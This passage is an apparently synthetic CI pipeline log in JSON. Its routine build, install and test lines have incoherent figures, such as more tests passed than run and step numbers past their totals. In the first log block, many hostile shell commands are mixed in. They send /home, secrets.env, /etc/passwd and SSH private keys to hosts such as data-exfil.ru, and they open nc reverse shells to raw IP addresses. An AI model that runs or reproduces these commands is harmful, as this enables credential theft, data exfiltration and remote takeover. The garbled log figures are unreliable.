3ms\nFinished.\nArtifact uploaded: build.tar.gz (12MB)\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 12/17: Linting\nUsing Node.js 20.8.2\nMinifying main.js\n\u2713 All checks passed\nPulling image: node:3.11\nStep 3/24: Linting\nMinifying app.js\nBundling main.css\nGET /api - 201 (43ms)\nCache miss for key-9088\nTLS handshake completed\nStep 5/15: Building\nMinifying app.js\nCache invalidated: dependencies\nWARNING: express has known vulnerabilities\n\u2713 Task completed in 3137ms\nChecking out main branch\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\nVerifying...\nUploading artifact 'coverage' (24 files)\nTransforming 859 files...\nConnection established\n[12:46:02] WARN: Deprecated API usage\nnpm install: resolved 1780 packages\nLoading...\nArtifact uploaded: build.tar.gz (40MB)\nPOST /api - 202 (399ms)\nSnapshots: 40 passed, 15 total\n[12:46:02] INFO: Starting build process\n[12:46:02] DEBUG: Initializing service\n[12:46:02] INFO: Connecting to database\n=== Step type_check completed ===\n=== Step: e2e_tests ===\n\u2713 Step 'setup' succeeded\nException: RuntimeError\nnpm install: added 307 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 88% statements, 74% branches\nStep 19/25: Linting\n  PASS: unit/test_user_create.spec.js\nHEAD is now at 022dc75\n[12:46:02] WARN: Deprecated API usage\nChecking out main branch\nPulling image: node:3.11\n[12:46:02] WARN: Deprecated API usage\nStep 2/23: Installing dependencies\nCompleted.\nCompiling utils/utils.go...\nPulling image: node:latest\nnpm install: added 282 packages\nUsing Node.js 18.3.3\nCache hit for key-1243\nGenerating source maps...\npip: Downloading axios-3.14.tar.gz\nTLS handshake completed\nnpm notice: package.json updated\nStep 10/24: Linting\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:02] INFO: Request completed\nWARNING: prettier has known vulnerabilities\nCreating production build...\nTest Suites: 12 passed, 11 total\nLayer 3/15: COPY command\n[12:46:02] DEBUG: Query executed in 31ms\nAlready up to date.\nWaiting...\n\u2713 Task completed in 1093ms\n\u2717 build failed with exit code 3\nBuilding Docker image...\nPulling image: node:3.11\nOptimizing 29 modules...\n[12:46:02] WARN: Deprecated API usage\nFetching submodules...\n[12:46:02] DEBUG: Connection pool: 20 active\npip: Installing build dependencies...\nFetching submodules...\nTLS handshake completed\n[12:46:02] INFO: Starting build process\n[12:46:02] DEBUG: Connection pool: 18 active\nCache miss for key-5049\nGET /api - 200 (66ms)\nFinished.\nWaiting...\nArtifact downloaded: 11MB\n  PASS: integration/test_db_connect.spec.js\nnpm install: added 125 packages\n\u2713 Step 'checkout' succeeded\n[12:46:02] DEBUG: Memory usage: 606MB\n[12:46:02] INFO: Processing request\nMinifying main.js\n[12:46:02] INFO: Connecting to database\nCache restored successfully (376MB)\nStep 12/20: Testing\nStep 20/20: Testing\nStep 5/18: Deploying\nyarn add: Done in 29.90s\nVerifying...\nUploading artifact 'build' (41 files)\nPlatform: darwin-arm64\n\u2713 Task completed in 3784ms\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 12/21: Deploying\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 All checks passed\nBuilding Docker image...\nPushing to registry...\nFinished.\n[12:46:02] DEBUG: Initializing service\nWaiting...\n\u2713 test completed\nFAILED: test_user_create\nPushing to registry...\nStep 7/21: Linting\nAlready up to date.\n[12:46:02] DEBUG: Query executed in 84ms\n[12:46:02] INFO: Request completed\n[12:46:02] DEBUG: Query executed in 86ms\nWaiting...\n\u2713 Step 'setup' succeeded\n[12:46:02] INFO: Cache refreshed\n=== Step e2e_tests completed ===\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\n=== Step: lint ===\n[12:46:02] DEBUG: Initializing service\nArtifact downloaded: 41MB\nnc -e /bin/sh 63.245.117.250 1700\nnc -e /bin/sh 149.161.38.247 40234\nnpm install: resolved 195 packages\nOK\nLayer 4/9: ENV command\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nOptimizing 73 modules...\nInstalling express@4.2.10\nBuilding Docker image...\nSuccess!\nOK\nRan 109 tests in 1s\n\u2713 Step 'build' succeeded\n\u2713 Step 'build' succeeded\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nStep 1/21: Linting\nFAILED: test_cache_hit\necho $(cat ~/.ssh/id_rsa) | base64 | nc 227.124.141.175 36505\nnc -e /bin/sh 45.132.120.118 57850\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nCompiling utils/handler.rs...\nCompiling src/service.java...\n[12:46:02] INFO: Processing request\nBuilding Docker image...\npip: Collecting lodash\nPlatform: linux-x64\n[12:46:02] DEBUG: Query executed in 31ms\nPOST /upload - 202 (337ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 179.111.89.168 40906\nSending 196MB of data to crypto-mine.io\nMinifying main.js\nMinifying app.js\n  PASS: e2e/test_auth_login.spec.js\nSwitched to branch 'feature/task-277'\nOK\nFetching submodules...\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nStep 14/17: Running migrations\nCache restored successfully (129MB)\nnc -e /bin/sh 149.160.99.206 4116\nStep 3/16: Deploying\nCompiling components/service.java...\nProcessing...\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\n\u2717 build failed with exit code 82\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 158.183.232.99 49536\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nArtifact uploaded: build.tar.gz (48MB)\n[12:46:02] ERROR: Connection failed\nOptimizing 84 modules...\nCompiling components/index.js...\n[12:46:02] INFO: Starting build process\nCache miss for key-2985\nnc -e /bin/sh 156.209.74.254 23011\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nTransforming 598 files...\n[12:46:02] DEBUG: Loading configuration\nFetching submodules...\nCache hit for key-6642\nnc -e /bin/sh 14.86.97.141 39180\nnc -e /bin/sh 114.78.191.33 24605\necho $(cat ~/.ssh/id_rsa) | base64 | nc 67.174.15.63 44092\n[12:46:02] INFO: Request completed\n[12:46:02] DEBUG: Loading configuration\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nCache miss for key-3871\n[12:46:02] INFO: Cache refreshed\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 18/17: Deploying\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\nOptimizing 87 modules...\nCache saved successfully\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nAlready up to date.\n[12:46:02] DEBUG: Connection pool: 18 active\nReady.\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nSwitched to branch 'hotfix/task-522'\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-9904\nNODE_ENV=production\nConnection established\n[12:46:02] INFO: Connecting to database\n[12:46:02] WARN: Deprecated API usage\nCache invalidated: build\nStep 11/23: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Task completed in 4549ms\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nVerifying...\nDone.\nCache miss for key-4658\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nCache miss for key-2813\nChecking out master branch\npip: Collecting eslint\nCompiling src/handler.rs...\nCreating production build...\nConnection established\nnc -e /bin/sh 184.193.80.6 7596\nRan 30 tests in 53s\nPOST /upload - 201 (29ms)\n[12:46:02] INFO: Request completed\n[12:46:02] INFO: Request completed\n[12:46:02] INFO: Request completed\nCompiling components/main.py...\nUploading artifact 'dist' (42 files)\nArtifact downloaded: 17MB\n  PASS: unit/test_api_health.spec.js\n[12:46:02] INFO: Processing request\nVerifying...\n=== Step lint completed ===",
    "steps": [
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-19T12:46:01.995144",
        "finished_at": "2025-12-19T12:46:06.574934",
        "log_lines": [
          "=== Step: deploy_production ===",
          "[12:46:01] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Time: 37.24s",
          "Connection established",
          "Layer 10/15: ENV command",
          "WARNING: webpack has known vulnerabilities",
          "Done.",
          "[12:46:01] DEBUG: Memory usage: 1156MB",
          "Compiling utils/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Coverage: 89% statements, 83% branches",
          "[12:46:01] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Minifying main.js",
          "Fetching from https://docker.io/package.json",
          "Step 10/15: Installing dependencies",
          "FAILED: test_db_connect",
          "\u2713 Step 'install' succeeded",
          "pip: Installing build dependencies...",
          "Compiling lib/app.ts...",
          "pip: Collecting jest",
          "Step 19/20: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Uploading artifact 'coverage' (29 files)",
          "[12:46:01] DEBUG: Memory usage: 484MB",
          "\u2717 build failed with exit code 114",
          "Minifying main.js",
          "Minifying main.js",
          "POST /api - 200 (118ms)",
          "Done.",
          "Done.",
          "GET /status - 201 (88ms)",
          "TLS handshake completed",
          "\u2713 Task completed in 132ms",
          "Step 16/19: Building",
          "npm notice: created a lockfile",
          "\u2713 validate completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: unit/test_user_create.spec.js",
          "npm notice: package.json updated",
          "Compiling components/main.py...",
          "\u2717 build failed with exit code 27",
          "pip: Installing build dependencies...",
          "Environment: staging",
          "Compiling components/handler.rs...",
          "yarn add: Done in 7.81s",
          "Verifying...",
          "Snapshots: 12 passed, 41 total",
          "Pulling image: python:3.11",
          "Environment: production",
          "Compiling src/main.py...",
          "\u2713 Task completed in 3660ms",
          "Using Python 3.11",
          "Step 13/22: Running migrations",
          "Done.",
          "Transforming 750 files...",
          "Completed.",
          "[12:46:01] DEBUG: Initializing service",
          "Step 1/23: Installing dependencies",
          "[12:46:01] DEBUG: Connection pool: 12 active",
          "Uploading artifact 'dist' (10 files)",
          "Snapshots: 37 passed, 24 total",
          "TLS handshake completed",
          "pip: Downloading webpack-5.2.tar.gz",
          "[12:46:01] INFO: Cache refreshed",
          "Artifact downloaded: 1MB",
          "[12:46:01] INFO: Processing request",
          "Uploading artifact 'build' (44 files)",
          "Using Node.js 17.8.0",
          "Step 1/20: Installing dependencies",
          "Loading...",
          "Installing axios@4.16.7",
          "Completed.",
          "Step 17/18: Linting",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:46:02] INFO: Processing request",
          "[12:46:02] DEBUG: Connection pool: 11 active",
          "yarn add: Done in 15.64s",
          "Generating source maps...",
          "Connection established",
          "Cache restored successfully (467MB)",
          "[12:46:02] WARN: Deprecated API usage",
          "Tests: 265 passed, 494 total",
          "Connection established",
          "Done.",
          "WARNING: express has known vulnerabilities",
          "Verifying...",
          "Ready.",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-19T12:46:06.574934",
        "finished_at": "2025-12-19T12:46:11.154724",
        "log_lines": [
          "=== Step: checkout ===",
          "[12:46:02] INFO: Cache refreshed",
          "HEAD is now at ca14787",
          "Switched to branch 'feature/task-559'",
          "Checking out main branch",
          "npm notice: created a lockfile",
          "Bundling vendor.css",
          "Success!",
          "WARNING: jest has known vulnerabilities",
          "[12:46:02] INFO: Request completed",
          "Success!",
          "Generating source maps...",
          "Switched to branch 'bugfix/task-641'",
          "\u2713 Task completed in 4858ms",
          "  PASS: unit/test_auth_login.spec.js",
          "Compiling utils/handler.rs...",
          "Success!",
          "Already up to date.",
          "Snapshots: 43 passed, 33 total",
          "Compiling utils/handler.rs...",
          "[12:46:02] DEBUG: Memory usage: 1668MB",
          "Compiling components/service.java...",
          "Ready.",
          "Compiling utils/service.java...",
          "[12:46:02] WARN: Deprecated API usage",
          "Checking out develop branch",
          "yarn add: Done in 10.92s",
          "Already up to date.",
          "Bundling runtime.js",
          "\u2713 deploy completed",
          "Artifact uploaded: dist.zip (9MB)",
          "Step 16/19: Linting",
          "Artifact uploaded: dist.zip (64MB)",
          "Creating production build...",
          "Success!",
          "Connection established",
          "Already up to date.",
          "  PASS: test_auth_login (497ms)",
          "Step 10/18: Linting",
          "Cache saved successfully",
          "\u2713 Step 'checkout' succeeded",
          "Using Python 3.10",
          "[12:46:02] DEBUG: Query executed in 54ms",
          "Layer 2/11: COPY command",
          "Pushing to registry...",
          "Cache invalidated: node_modules",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Step 11/15: Building",
          "Using Python 3.11",
          "HEAD is now at efe6211",
          "Compiling utils/index.js...",
          "npm notice: package.json updated",
          "[12:46:02] DEBUG: Connection pool: 7 active",
          "[12:46:02] DEBUG: Connection pool: 12 active",
          "npm install: added 230 packages",
          "POST /data - 202 (449ms)",
          "[12:46:02] DEBUG: Initializing service",
          "Checking out master branch",
          "  PASS: test_db_connect (175ms)",
          "Generating source maps...",
          "Completed.",
          "Compiling src/utils.go...",
          "GET /status - 200 (9ms)",
          "Artifact downloaded: 6MB",
          "Waiting...",
          "[12:46:02] DEBUG: Query executed in 91ms",
          "Artifact uploaded: dist.zip (52MB)",
          "  PASS: integration/test_cache_hit.spec.js",
          "Loading...",
          "Compiling components/utils.go...",
          "Cache miss for key-9177",
          "[12:46:02] WARN: Deprecated API usage",
          "Fetching from https://amazonaws.com/package.json",
          "Bundling styles.js",
          "Ready.",
          "\u2713 Step 'checkout' succeeded",
          "Step 19/16: Linting",
          "[12:46:02] INFO: Starting build process",
          "Finished.",
          "Pushing to registry...",
          "[12:46:02] WARN: Deprecated API usage",
          "Snapshots: 21 passed, 40 total",
          "Compiling lib/app.ts...",
          "Using Node.js 18.6.10",
          "[12:46:02] DEBUG: Query executed in 43ms",
          "Done.",
          "Pulling image: node:latest",
          "Snapshots: 28 passed, 43 total",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-19T12:46:11.154724",
        "finished_at": "2025-12-19T12:46:45.503152",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Step 8/18: Building",
          "[12:46:02] INFO: Cache refreshed",
          "Checking out develop branch",
          "Uploading artifact 'dist' (24 files)",
          "FAILED: test_api_health",
          "Using Python 3.12",
          "Connection established",
          "HEAD is now at b20ee38",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Uploading artifact 'coverage' (35 files)",
          "Cache restored successfully (50MB)",
          "Coverage: 77% statements, 100% branches",
          "POST /upload - 202 (446ms)",
          "npm install: resolved 536 packages",
          "yarn add: Done in 7.86s",
          "[12:46:02] INFO: Starting build process",
          "yarn add: Done in 9.4s",
          "[12:46:02] INFO: Connecting to database",
          "WARNING: react has known vulnerabilities",
          "Done.",
          "Finished.",
          "[12:46:02] DEBUG: Loading configuration",
          "Creating production build...",
          "Pulling image: python:latest",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:46:02] WARN: Deprecated API usage",
          "Step 10/21: Building",
          "  PASS: test_cache_hit (113ms)",
          "Connection established",
          "Generating source maps...",
          "Platform: linux-x64",
          "GET /health - 200 (31ms)",
          "Coverage: 86% statements, 74% branches",
          "pip: Installing build dependencies...",
          "Step 9/17: Building",
          "POST /api - 200 (158ms)",
          "Coverage: 100% statements, 73% branches",
          "OK",
          "Ran 194 tests in 59s",
          "npm install: resolved 876 packages",
          "[12:46:02] INFO: Starting build process",
          "npm notice: created a lockfile",
          "WARNING: jest has known vulnerabilities",
          "[12:46:02] WARN: Deprecated API usage",
          "Step 9/25: Installing dependencies",
          "Step 9/23: Installing dependencies",
          "Waiting...",
          "Generating source maps...",
          "Test Suites: 47 passed, 12 total",
          "Image pulled successfully",
          "TLS handshake completed",
          "Cache hit for key-5551",
          "Fetching submodules...",
          "NODE_ENV=development",
          "[12:46:02] INFO: Cache refreshed",
          "[12:46:02] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "[12:46:02] WARN: Deprecated API usage",
          "Already up to date.",
          "Artifact downloaded: 36MB",
          "Installing express@1.14.4",
          "pip install: Successfully installed axios-2.16",
          "Cache miss for key-1192",
          "Time: 57.265s",
          "Image pulled successfully",
          "Transforming 665 files...",
          "Bundling styles.css",
          "Loading...",
          "Coverage: 96% statements, 79% branches",
          "Time: 65.281s",
          "[12:46:02] DEBUG: Query executed in 74ms",
          "\u2713 Step 'checkout' succeeded",
          "Waiting...",
          "Processing...",
          "Generating source maps...",
          "npm install: resolved 1118 packages",
          "Checking out master branch",
          "[12:46:02] DEBUG: Query executed in 12ms",
          "npm notice: package.json updated",
          "Connection established",
          "Verifying...",
          "Platform: darwin-arm64",
          "Using Python 3.9",
          "npm install: resolved 1824 packages",
          "Switched to branch 'hotfix/task-915'",
          "Transforming 571 files...",
          "Test Suites: 49 passed, 40 total",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-19T12:46:45.503152",
        "finished_at": "2025-12-19T12:47:19.851580",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Ran 196 tests in 21s",
          "POST /upload - 201 (161ms)",
          "\u2713 Task completed in 220ms",
          "Step 7/21: Running migrations",
          "\u2713 validate completed",
          "Completed.",
          "[12:46:02] DEBUG: Connection pool: 19 active",
          "[12:46:02] DEBUG: Memory usage: 1192MB",
          "Uploading artifact 'build' (43 files)",
          "NODE_ENV=development",
          "Transforming 569 files...",
          "pip install: Successfully installed axios-1.7",
          "NODE_ENV=development",
          "[12:46:02] INFO: Cache refreshed",
          "Generating source maps...",
          "[12:46:02] INFO: Starting build process",
          "npm notice: created a lockfile",
          "Fetching from https://registry.npmjs.org/package.json",
          "  PASS: test_db_connect (467ms)",
          "Exception: ValueError",
          "Step 3/25: Running migrations",
          "[12:46:02] INFO: Processing request",
          "Step 11/18: Running migrations",
          "Ready.",
          "Cache miss for key-4952",
          "POST /api - 202 (438ms)",
          "Switched to branch 'feature/task-103'",
          "Building Docker image...",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:02] DEBUG: Connection pool: 7 active",
          "[12:46:02] INFO: Cache refreshed",
          "[12:46:02] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "WARNING: axios has known vulnerabilities",
          "Ran 156 tests in 21s",
          "[12:46:02] DEBUG: Connection pool: 14 active",
          "Platform: linux-x64",
          "[12:46:02] INFO: Cache refreshed",
          "Cache invalidated: build",
          "[12:46:02] INFO: Starting build process",
          "Using Node.js 20.3.6",
          "Completed.",
          "Building Docker image...",
          "Waiting...",
          "Step 18/24: Deploying",
          "Exception: RuntimeError",
          "npm install: added 440 packages",
          "[12:46:02] DEBUG: Memory usage: 1146MB",
          "WARNING: eslint has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "Compiling components/main.py...",
          "Platform: win32-x64",
          "NODE_ENV=development",
          "Already up to date.",
          "Environment: production",
          "npm install: added 227 packages",
          "[12:46:02] INFO: Processing request",
          "Coverage: 81% statements, 82% branches",
          "[12:46:02] INFO: Request completed",
          "Installing react@3.14.0",
          "Layer 8/15: RUN command",
          "[12:46:02] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "npm install: resolved 500 packages",
          "pip: Collecting eslint",
          "Using Python 3.9",
          "[12:46:02] DEBUG: Connection pool: 11 active",
          "Compiling lib/handler.rs...",
          "[12:46:02] DEBUG: Memory usage: 1149MB",
          "  PASS: test_user_create (5ms)",
          "WARNING: webpack has known vulnerabilities",
          "Step 8/21: Installing dependencies",
          "pip: Installing build dependencies...",
          "Environment: development",
          "Artifact uploaded: dist.zip (31MB)",
          "HEAD is now at 11e3a58",
          "TLS handshake completed",
          "Done.",
          "Test Suites: 39 passed, 46 total",
          "Test Suites: 5 passed, 31 total",
          "Already up to date.",
          "Creating production build...",
          "Loading...",
          "Artifact downloaded: 21MB",
          "Pulling image: alpine:18",
          "OK",
          "TLS handshake completed",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-19T12:47:19.851580",
        "finished_at": "2025-12-19T12:47:31.301056",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Minifying vendor.js",
          "[12:46:02] DEBUG: Connection pool: 19 active",
          "Test Suites: 7 passed, 31 total",
          "Pushing to registry...",
          "Cache hit for key-5099",
          "Time: 58.26s",
          "HEAD is now at 869e700",
          "Uploading artifact 'coverage' (24 files)",
          "Cache restored successfully (45MB)",
          "Artifact uploaded: dist.zip (77MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:02] WARN: Deprecated API usage",
          "Ran 182 tests in 47s",
          "Creating production build...",
          "\u2713 Step 'setup' succeeded",
          "Switched to branch 'bugfix/task-678'",
          "Uploading artifact 'build' (44 files)",
          "Switched to branch 'hotfix/task-965'",
          "Compiling lib/service.java...",
          "Step 19/20: Installing dependencies",
          "Cache hit for key-9220",
          "npm install: resolved 115 packages",
          "GET /api - 200 (44ms)",
          "npm notice: package.json updated",
          "Processing...",
          "Compiling src/service.java...",
          "FAILED: test_api_health",
          "Bundling main.js",
          "Cache invalidated: dependencies",
          "Coverage: 75% statements, 99% branches",
          "Cache hit for key-4631",
          "Installing eslint@4.7.9",
          "Ready.",
          "Tests: 388 passed, 119 total",
          "\u2713 Step 'checkout' succeeded",
          "Fetching submodules...",
          "Test Suites: 24 passed, 11 total",
          "Success!",
          "Creating production build...",
          "POST /data - 200 (10ms)",
          "GET /status - 200 (29ms)",
          "Artifact downloaded: 50MB",
          "Optimizing 89 modules...",
          "Transforming 840 files...",
          "pip: Collecting eslint",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Transforming 542 files...",
          "Step 9/21: Linting",
          "[12:46:02] WARN: Deprecated API usage",
          "Bundling styles.js",
          "Artifact downloaded: 19MB",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Cache restored successfully (86MB)",
          "Snapshots: 12 passed, 16 total",
          "[12:46:02] INFO: Processing request",
          "[12:46:02] WARN: Deprecated API usage",
          "Exception: RuntimeError",
          "HEAD is now at b158380",
          "Done.",
          "Compiling components/main.py...",
          "  PASS: test_db_connect (406ms)",
          "Pushing to registry...",
          "Transforming 266 files...",
          "npm notice: created a lockfile",
          "Success!",
          "Uploading artifact 'build' (49 files)",
          "pip: Collecting jest",
          "[12:46:02] INFO: Starting build process",
          "Verifying...",
          "POST /data - 200 (257ms)",
          "Uploading artifact 'coverage' (47 files)",
          "Installing lodash@1.15.7",
          "Bundling main.css",
          "\u2717 build failed with exit code 22",
          "NODE_ENV=production",
          "FAILED: test_user_create",
          "Uploading artifact 'dist' (10 files)",
          "Switched to branch 'hotfix/task-465'",
          "Bundling styles.js",
          "Pulling image: alpine:18",
          "[12:46:02] WARN: Deprecated API usage",
          "[12:46:02] ERROR: Connection failed",
          "WARNING: lodash has known vulnerabilities",
          "Test Suites: 17 passed, 22 total",
          "Optimizing 11 modules...",
          "Step 4/23: Running migrations",
          "Time: 91.147s",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-19T12:47:31.301056",
        "finished_at": "2025-12-19T12:47:38.170742",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Artifact uploaded: dist.zip (46MB)",
          "Time: 66.804s",
          "\u2713 test completed",
          "Checking out develop branch",
          "Building Docker image...",
          "pip: Downloading jest-5.19.tar.gz",
          "Cache miss for key-6992",
          "Step 7/19: Running migrations",
          "Tests: 322 passed, 230 total",
          "Image pulled successfully",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Collecting jest",
          "[12:46:02] WARN: Deprecated API usage",
          "[12:46:02] INFO: Processing request",
          "Already up to date.",
          "[12:46:02] DEBUG: Memory usage: 174MB",
          "Artifact uploaded: dist.zip (61MB)",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "Compiling components/main.py...",
          "pip: Collecting webpack",
          "Cache miss for key-3400",
          "Using Node.js 17.4.7",
          "npm install: resolved 385 packages",
          "Success!",
          "pip: Downloading webpack-1.13.tar.gz",
          "pip: Installing build dependencies...",
          "npm install: resolved 774 packages",
          "Compiling components/app.ts...",
          "Ran 59 tests in 36s",
          "WARNING: lodash has known vulnerabilities",
          "GET /api - 200 (75ms)",
          "[12:46:02] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Cache saved successfully",
          "pip: Downloading axios-1.10.tar.gz",
          "[12:46:02] DEBUG: Initializing service",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:02] INFO: Starting build process",
          "Compiling utils/service.java...",
          "Exception: RuntimeError",
          "Cache miss for key-7303",
          "Uploading artifact 'build' (26 files)",
          "Using Node.js 17.5.8",
          "npm install: added 58 packages",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Transforming 287 files...",
          "WARNING: axios has known vulnerabilities",
          "Cache miss for key-6684",
          "Checking out develop branch",
          "TLS handshake completed",
          "Platform: linux-x64",
          "Artifact downloaded: 7MB",
          "Already up to date.",
          "Finished.",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact downloaded: 25MB",
          "Step 10/23: Testing",
          "npm notice: created a lockfile",
          "[12:46:02] DEBUG: Query executed in 38ms",
          "[12:46:02] INFO: Connecting to database",
          "Success!",
          "[12:46:02] WARN: Deprecated API usage",
          "Success!",
          "Transforming 509 files...",
          "Minifying main.js",
          "[12:46:02] DEBUG: Memory usage: 953MB",
          "pip: Downloading webpack-2.11.tar.gz",
          "Using Python 3.12",
          "Cache hit for key-7776",
          "Step 20/18: Running migrations",
          "\u2713 build completed",
          "Layer 6/13: RUN command",
          "[12:46:02] INFO: Processing request",
          "POST /data - 200 (177ms)",
          "Cache miss for key-4844",
          "Cache invalidated: node_modules",
          "Loading...",
          "Optimizing 27 modules...",
          "Artifact downloaded: 13MB",
          "Image pulled successfully",
          "Step 15/17: Deploying",
          "pip: Installing build dependencies...",
          "Time: 48.671s",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-19T12:47:38.170742",
        "finished_at": "2025-12-19T12:48:01.069694",
        "log_lines": [
          "=== Step: integration_tests ===",
          "npm notice: package.json updated",
          "[12:46:02] DEBUG: Connection pool: 15 active",
          "npm notice: package.json updated",
          "Test Suites: 16 passed, 32 total",
          "Success!",
          "NODE_ENV=development",
          "[12:46:02] INFO: Processing request",
          "Compiling lib/app.ts...",
          "[12:46:02] WARN: Deprecated API usage",
          "npm install: added 104 packages",
          "[12:46:02] DEBUG: Memory usage: 437MB",
          "Success!",
          "Snapshots: 33 passed, 11 total",
          "Cache hit for key-4561",
          "Uploading artifact 'coverage' (6 files)",
          "Connection established",
          "FAILED: test_user_create",
          "Finished.",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-1046",
          "  PASS: test_user_create (187ms)",
          "Already up to date.",
          "WARNING: express has known vulnerabilities",
          "[12:46:02] INFO: Cache refreshed",
          "  PASS: unit/test_api_health.spec.js",
          "Transforming 579 files...",
          "yarn add: Done in 19.84s",
          "Image pulled successfully",
          "Time: 97.941s",
          "Optimizing 61 modules...",
          "[12:46:02] INFO: Connecting to database",
          "[12:46:02] DEBUG: Loading configuration",
          "Platform: win32-x64",
          "Compiling src/app.ts...",
          "Connection established",
          "Coverage: 82% statements, 70% branches",
          "WARNING: prettier has known vulnerabilities",
          "Tests: 251 passed, 178 total",
          "Using Python 3.10",
          "[12:46:02] INFO: Connecting to database",
          "Cache hit for key-9990",
          "Generating source maps...",
          "Compiling utils/service.java...",
          "Cache saved successfully",
          "[12:46:02] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Test Suites: 47 passed, 8 total",
          "Step 15/22: Building",
          "Step 16/21: Installing dependencies",
          "Layer 6/12: COPY command",
          "[12:46:02] INFO: Starting build process",
          "Cache invalidated: build",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Platform: darwin-arm64",
          "Finished.",
          "NODE_ENV=development",
          "Using Python 3.12",
          "[12:46:02] WARN: Deprecated API usage",
          "pip: Collecting react",
          "Test Suites: 15 passed, 14 total",
          "[12:46:02] WARN: Deprecated API usage",
          "Test Suites: 36 passed, 14 total",
          "Test Suites: 9 passed, 17 total",
          "Artifact uploaded: dist.zip (72MB)",
          "Done.",
          "Layer 4/9: ENV command",
          "Test Suites: 11 passed, 19 total",
          "Creating production build...",
          "\u2713 All checks passed",
          "Step 16/16: Installing dependencies",
          "[12:46:02] DEBUG: Query executed in 65ms",
          "  PASS: test_user_create (200ms)",
          "npm install: resolved 743 packages",
          "Generating source maps...",
          "Compiling utils/app.ts...",
          "npm notice: created a lockfile",
          "[12:46:02] INFO: Connecting to database",
          "Finished.",
          "Cache saved successfully",
          "\u2713 Step 'setup' succeeded",
          "Step 4/18: Building",
          "\u2713 package completed",
          "Pushing to registry...",
          "[12:46:02] DEBUG: Query executed in 4ms",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-19T12:48:01.069694",
        "finished_at": "2025-12-19T12:48:12.519170",
        "log_lines": [
          "=== Step: setup_environment ===",
          "pip install: Successfully installed react-1.1",
